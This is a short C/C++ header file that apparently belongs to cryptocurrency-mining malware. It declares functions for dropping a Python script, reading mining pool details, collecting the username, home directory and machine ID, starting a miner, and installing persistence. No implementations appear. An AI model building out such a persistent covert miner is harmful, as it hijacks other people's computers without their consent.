#ifndef UTILS_H
#define UTILS_H 
#include <iostream>
#include <string>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <stdio.h>
#include <pwd.h>
#include <sys/stat.h>
#include <cstring>
#include <fcntl.h>
#include <cstring>

typedef struct pool_info{
    char * pool, *id;
}pool_info;

void drop_python_script();
pool_info* get_pool_info();
char * get_username();
char * get_home_enviroment();
char * get_machine_id();
void new_miner();
void install_persistence();
void set_persistence_bits();

#endif